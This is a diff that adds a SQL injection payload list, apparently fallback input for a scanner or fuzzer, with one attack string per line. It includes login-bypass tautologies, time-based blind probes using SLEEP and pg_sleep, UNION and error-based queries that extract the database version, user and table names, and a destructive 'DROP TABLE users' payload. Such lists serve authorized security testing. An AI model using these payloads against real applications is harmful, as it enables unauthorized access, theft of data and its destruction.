@@ -1,0 +1,35 @@
+# SQL Injection fallback payloads
+# Syntax: one payload per line, # = comment
+'
+''
+`
+"
+\
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+admin'--
+admin'#
+' OR 'x'='x
+1' OR '1'='1'--
+1 OR 1=1
+1; SELECT SLEEP(3)--
+1' AND SLEEP(3)--
+1' AND pg_sleep(3)--
+' UNION SELECT null--
+' UNION SELECT null,null--
+' UNION SELECT null,null,null--
+' UNION SELECT 1,version(),3--
+' UNION SELECT 1,database(),3--
+' UNION SELECT 1,user(),3--
+' UNION SELECT 1,table_name,3 FROM information_schema.tables--
+1 AND 1=CONVERT(int,@@version)--
+' AND extractvalue(1,concat(0x7e,version()))--
+' AND updatexml(1,concat(0x7e,version()),1)--
+' OR 1=1 LIMIT 1--
+') OR ('1'='1
+")) OR (("1"="1
+1'; DROP TABLE users--
+0x27 OR 0x313D31--
+%27 OR %271%27%3D%271
